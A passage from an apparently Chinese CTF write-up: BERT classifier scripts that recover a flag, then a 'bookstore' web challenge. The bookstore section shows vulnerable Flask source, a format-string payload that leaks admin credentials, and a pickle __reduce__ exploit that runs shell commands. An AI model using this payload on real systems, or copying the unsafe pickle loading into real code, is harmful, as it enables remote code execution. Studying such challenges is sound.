class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">from</span> torch.utils.data <span class="keyword">import</span> Dataset, DataLoader</span><br><span class="line"><span class="keyword">from</span> transformers <span class="keyword">import</span> BertTokenizer, BertForSequenceClassification</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">from</span> torch.optim <span class="keyword">import</span> AdamW</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载数据集</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;dataset.json&#x27;</span>, <span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&quot;UTF-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = json.load(f)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 准备文本和标签</span></span><br><span class="line">contents = []</span><br><span class="line">labels = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">    contents.append(data[i][<span class="string">&#x27;conversation&#x27;</span>][<span class="number">1</span>][<span class="string">&#x27;content&#x27;</span>])</span><br><span class="line">    labels.append(data[i][<span class="string">&#x27;label&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载预训练的BERT分词器</span></span><br><span class="line">tokenizer = BertTokenizer.from_pretrained(<span class="string">&#x27;bert-mini-model&#x27;</span>)</span><br><span class="line"><span class="comment"># 加载预训练的BERT序列分类模型，设置输出类别数为4</span></span><br><span class="line">model = BertForSequenceClassification.from_pretrained(<span class="string">&#x27;bert-mini-model&#x27;</span>, num_labels=<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用分词器处理所有文本：</span></span><br><span class="line"><span class="comment">#   truncation=True - 超过最大长度的文本将被截断</span></span><br><span class="line"><span class="comment">#   padding=&#x27;max_length&#x27; - 填充到最大长度</span></span><br><span class="line"><span class="comment">#   max_length=512 - 设置最大序列长度（BERT的标准长度）</span></span><br><span class="line"><span class="comment">#   return_tensors=&#x27;pt&#x27; - 返回PyTorch张量</span></span><br><span class="line">encodings = tokenizer(contents, truncation=<span class="literal">True</span>, padding=<span class="string">&#x27;max_length&#x27;</span>, max_length=<span class="number">512</span>, return_tensors=<span class="string">&#x27;pt&#x27;</span>)</span><br><span class="line"><span class="comment"># 获取编码后的输入ID张量</span></span><br><span class="line">input_ids = encodings[<span class="string">&#x27;input_ids&#x27;</span>]</span><br><span class="line"><span class="comment"># 获取注意力掩码张量（标识实际内容与填充部分）</span></span><br><span class="line">attention_mask = encodings[<span class="string">&#x27;attention_mask&#x27;</span>]</span><br><span class="line"><span class="comment"># 将标签列表转换为PyTorch张量</span></span><br><span class="line">labels = torch.tensor(labels)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建数据集和数据加载器</span></span><br><span class="line">dataset = torch.utils.data.TensorDataset(input_ids, attention_mask, labels)</span><br><span class="line">dataloaded = DataLoader(dataset, batch_size=<span class="number">8</span>, shuffle=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置训练参数和设备</span></span><br><span class="line">device = torch.device(<span class="string">&#x27;cuda&#x27;</span> <span class="keyword">if</span> torch.cuda.is_available() <span class="keyword">else</span> <span class="string">&#x27;cpu&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Using device: <span class="subst">&#123;device&#125;</span>&quot;</span>)</span><br><span class="line">model.to(device)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化AdamW优化器，设置学习率为0.00002</span></span><br><span class="line">optimizer = AdamW(model.parameters(), lr=<span class="number">2e-5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    model.train()</span><br><span class="line">    total_loss = <span class="number">0</span></span><br><span class="line">    progress_bar = tqdm(dataloaded, desc=<span class="string">f&#x27;Epoch <span class="subst">&#123;epoch + <span class="number">1</span>&#125;</span>&#x27;</span>)  <span class="comment"># 创建进度条</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> batch <span class="keyword">in</span> progress_bar:</span><br><span class="line">        input_ids, attention_mask, labels = [b.to(device) <span class="keyword">for</span> b <span class="keyword">in</span> batch]</span><br><span class="line"></span><br><span class="line">        optimizer.zero_grad()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 前向传播</span></span><br><span class="line">        outputs = model(input_ids=input_ids, attention_mask=attention_mask, labels=labels)</span><br><span class="line">        loss = outputs[<span class="number">0</span>]  <span class="comment"># 获取损失值（分类任务中第一个返回值是损失）</span></span><br><span class="line">        total_loss += loss.item()  <span class="comment"># 累加损失值</span></span><br><span class="line"></span><br><span class="line">        loss.backward()  <span class="comment"># 反向传播计算梯度</span></span><br><span class="line">        optimizer.step()  <span class="comment"># 更新模型参数</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 更新进度条显示当前损失</span></span><br><span class="line">        progress_bar.set_postfix(&#123;<span class="string">&#x27;loss&#x27;</span>: loss.item()&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 计算并打印epoch平均损失</span></span><br><span class="line">    avg_loss = total_loss / <span class="built_in">len</span>(dataloaded)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;Epoch <span class="subst">&#123;epoch + <span class="number">1</span>&#125;</span>, Average Loss: <span class="subst">&#123;avg_loss:<span class="number">.4</span>f&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存训练好的模型和分词器</span></span><br><span class="line">model.save_pretrained(<span class="string">&#x27;trained_model&#x27;</span>)</span><br><span class="line">tokenizer.save_pretrained(<span class="string">&#x27;trained_tokenizer&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="预测结果"><a href="#预测结果" class="headerlink" title="预测结果"></a>预测结果</h3><p>predict.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">from</span> transformers <span class="keyword">import</span> BertTokenizer, BertForSequenceClassification</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> flag_process <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载训练好的模型</span></span><br><span class="line">model_path = <span class="string">&#x27;trained_model&#x27;</span></span><br><span class="line">tokenizer_path = <span class="string">&#x27;trained_tokenizer&#x27;</span></span><br><span class="line">tokenizer = BertTokenizer.from_pretrained(tokenizer_path)</span><br><span class="line">model = BertForSequenceClassification.from_pretrained(model_path)</span><br><span class="line"></span><br><span class="line">device = torch.device(<span class="string">&#x27;cuda&#x27;</span> <span class="keyword">if</span> torch.cuda.is_available() <span class="keyword">else</span> <span class="string">&#x27;cpu&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Using device: <span class="subst">&#123;device&#125;</span>&quot;</span>)</span><br><span class="line">model.to(device)</span><br><span class="line">model.<span class="built_in">eval</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理输入数据</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.json&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding = <span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    contents = json.load(f)</span><br><span class="line">    predict_contents = []</span><br><span class="line">    <span class="keyword">for</span> content <span class="keyword">in</span> contents:</span><br><span class="line">        predict_contents.append(content[<span class="string">&#x27;conversation&#x27;</span>][<span class="number">1</span>][<span class="string">&#x27;content&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(predict_contents)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 BERT 模型预测标签，输出 0-3 的数字标签（对应原始 flag 的编码）</span></span><br><span class="line">predictions = []</span><br><span class="line"><span class="keyword">for</span> text <span class="keyword">in</span> predict_contents:</span><br><span class="line">    encoding = tokenizer(text, max_length=<span class="number">512</span>, padding=<span class="string">&#x27;max_length&#x27;</span>, truncation=<span class="literal">True</span>, return_tensors=<span class="string">&#x27;pt&#x27;</span>)</span><br><span class="line">    input_ids = encoding[<span class="string">&#x27;input_ids&#x27;</span>].to(device)</span><br><span class="line">    attention_mask = encoding[<span class="string">&#x27;attention_mask&#x27;</span>].to(device)</span><br><span class="line">    <span class="keyword">with</span> torch.no_grad():</span><br><span class="line">        outputs = model(input_ids=input_ids, attention_mask=attention_mask)</span><br><span class="line"></span><br><span class="line">    logits = outputs.logits</span><br><span class="line">    pred = torch.argmax(logits, dim=<span class="number">1</span>).item()</span><br><span class="line">    predictions.append(pred)</span><br><span class="line"></span><br><span class="line">labels = predictions</span><br><span class="line"><span class="comment"># 后面部分参考flag_process.py</span></span><br><span class="line">num_labels = <span class="built_in">len</span>(labels)</span><br><span class="line">num_labels_to_corrupt = math.ceil(num_labels * PERCENT_TO_CORRUPT)</span><br><span class="line">num_intervals = random.randint(<span class="number">1</span>, <span class="number">5</span>)</span><br><span class="line">intervals = []</span><br><span class="line">remaining_corruption = num_labels_to_corrupt</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(num_intervals):</span><br><span class="line">    <span class="keyword">if</span> remaining_corruption == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    start_index = random.randint(<span class="number">0</span>, num_labels - <span class="number">1</span>)</span><br><span class="line">    max_length = <span class="built_in">min</span>(remaining_corruption, num_labels - start_index)</span><br><span class="line">    interval_length = random.randint(<span class="number">1</span>, max_length)</span><br><span class="line">    end_index = start_index + interval_length</span><br><span class="line">    intervals.append((start_index, end_index))</span><br><span class="line">    remaining_corruption -= interval_length</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> start_index, end_index <span class="keyword">in</span> intervals:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start_index, end_index):</span><br><span class="line">        labels[i] = random.randint(<span class="number">0</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">noisy_message = encode_to_bytes(labels)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Noisy message (<span class="subst">&#123;<span class="built_in">len</span>(noisy_message)&#125;</span>):&quot;</span>, noisy_message)</span><br><span class="line">decoded_flag = decode_flag(noisy_message)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Decoded (recovered) message:&quot;</span>, decoded_flag)</span><br></pre></td></tr></table></figure>

<p>价值1000分的flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;umtsywtc-coxcigwv-njqbbipq-tqucbeip&#125;</span><br></pre></td></tr></table></figure>

<h2 id="bookstore"><a href="#bookstore" class="headerlink" title="bookstore"></a>bookstore</h2><p>&#x2F;backup 路由存在源代码泄露</p>
<p>app.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, \</span><br><span class="line">    session, g, redirect, url_for, \</span><br><span class="line">    abort, render_template, flash, \</span><br><span class="line">    render_template_string</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> settings <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> traceback</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config.update(<span class="built_in">dict</span>(</span><br><span class="line">    DATABASE=<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    DEBUG=<span class="literal">True</span>,</span><br><span class="line">    SECRET_KEY=os.environ.get(<span class="string">&#x27;SECRET_KEY&#x27;</span>),</span><br><span class="line">))</span><br><span class="line">app.config.from_envvar(<span class="string">&#x27;FLASKR_SETTINGS&#x27;</span>, silent=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ErrorHandler</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.notfound = <span class="string">&quot;Oops! That page doesn&#x27;t exist.&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.badreqyest = <span class="string">&quot;Your Rquest We Could Not Understand&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">page_not_found</span>(<span class="params">error</span>):</span><br><span class="line"></span><br><span class="line">    template = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;center-content error&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;h1&gt;&#123;error.notfound&#125; !!!&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;h2&gt;&#x27;&#x27;&#x27;</span> + request.url + <span class="string">&#x27;&#x27;&#x27;&lt;/h2&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    error = ErrorHandler()</span><br><span class="line">    <span class="keyword">return</span> template.<span class="built_in">format</span>(error = error), <span class="number">404</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_books</span>(<span class="params">book_name=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> book_name:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./books/&#x27;</span> + book_name, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                book = pickle.load(f)</span><br><span class="line">            <span class="keyword">return</span> book</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        books = []</span><br><span class="line">        dirs = os.listdir(<span class="string">&quot;./books/&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> book_name <span class="keyword">in</span> dirs:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./books/&#x27;</span> + book_name, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    book = pickle.load(f)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            books.append(book)</span><br><span class="line">        <span class="keyword">return</span> books</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save_book</span>(<span class="params">book_name, book_bio, book_img, book_price, book_num</span>):</span><br><span class="line">    book = pickle.dumps((book_name, book_img, book_bio, book_price, book_num))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./books/&#x27;</span> + book_name, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(book)</span><br><span class="line">        </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/bookAdd&quot;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;logged_in&#x27;</span>, <span class="literal">None</span>) <span class="keyword">and</span> session.get(<span class="string">&#x27;name&#x27;</span>, <span class="literal">None</span>) == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                book_name = request.form.get(<span class="string">&#x27;book_name&#x27;</span>)</span><br><span class="line">                book_bio = request.form.get(<span class="string">&#x27;book_bio&#x27;</span>)</span><br><span class="line">                book_price = <span class="built_in">int</span>(request.form.get(<span class="string">&#x27;book_price&#x27;</span>))</span><br><span class="line">                book_num = <span class="built_in">int</span>(request.form.get(<span class="string">&#x27;book_num&#x27;</span>))</span><br><span class="line"></span><br><span class="line">                f = request.files[<span class="string">&#x27;myfile&#x27;</span>]</span><br><span class="line">                book_img = f.filename</span><br><span class="line">                save_book(book_name, book_bio, book_img, book_price, book_num)</span><br><span class="line">                f.save(<span class="string">&quot;./static/img/&quot;</span>+f.filename)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                traceback.print_exc()</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Something Wrong!!!&quot;</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Book Add Success&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;tmpl/bookAdd.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;You are not login&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 主页</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;logged_in&#x27;</span>, <span class="literal">None</span>):</span><br><span class="line">        name = session.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> name == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        session[<span class="string">&#x27;logged_in&#x27;</span>] = <span class="number">0</span></span><br><span class="line">        session[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;Anonymous&#x27;</span></span><br><span class="line">        msg = <span class="string">&#x27;Please Login First, &#123;&#125; &#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, msg=msg.<span class="built_in">format</span>(session.get(<span class="string">&#x27;name&#x27;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        username = request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        password = request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> username == ADMIN_USER <span class="keyword">and</span> password == ADMIN_PASSWORD:</span><br><span class="line">            session[<span class="string">&#x27;logged_in&#x27;</span>] = <span class="number">1</span></span><br><span class="line">            session[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">        msg = <span class="string">&#x27;Please Login First, &#123;&#125; &#x27;</span></span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, msg=msg.<span class="built_in">format</span>(session.get(<span class="string">&#x27;name&#x27;</span>)))    </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    session[<span class="string">&#x27;logged_in&#x27;</span>] = <span class="number">0</span></span><br><span class="line">    session[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;Anonymous&#x27;</span></span><br><span class="line">    msg = <span class="string">&#x27;Please Login First, &#123;&#125; &#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, msg=msg.<span class="built_in">format</span>(session.get(<span class="string">&#x27;name&#x27;</span>)))  </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/bookDetail/&lt;string:book_name&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">book_detail</span>(<span class="params">book_name</span>):</span><br><span class="line">    book = get_books(book_name)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;tmpl/bookDetail.html&#x27;</span>, book=book)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/backup&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hint</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/bookList&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">book_list</span>():</span><br><span class="line">    books = get_books()</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;tmpl/bookList.html&#x27;</span>, books=books)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,debug=<span class="literal">False</span>,port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure>

<p>审计代码发现需要伪造admin进行图书保存从而实现pickle的反序列化</p>
<p>但伪造admin需要知道admin的账户密码。发现在404报错处存在格式化字符串漏洞</p>
<p>可以使用如下方式利用__ init __方法获取全局变量</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;error.__init__.__globals__&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2025/06/26/2025%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E4%BA%91%E5%A4%8D%E7%9B%98/1.png" alt="alt text"></p>
<p>得到账户密码为</p>
<p><img src="/2025/06/26/2025%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E4%BA%91%E5%A4%8D%E7%9B%98/2.png" alt="alt text"></p>
<p>admin:nishibukenengcaichulaide12345678</p>
<p>登陆后就可以进行书籍添加<br>然后就是生成一个pickle文件 上传上传到 books 目录下 命令执行即可</p>
<p>exp.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;__import__(&#x27;o&#x27;+&#x27;s&#x27;).system(&#x27;ls / &gt; ./static/img/ls&#x27;)&quot;</span>,))</span><br><span class="line">a = A()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./test.pkl&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    pickle.dump(a, f)</span><br></pre></td></tr></table></figure>

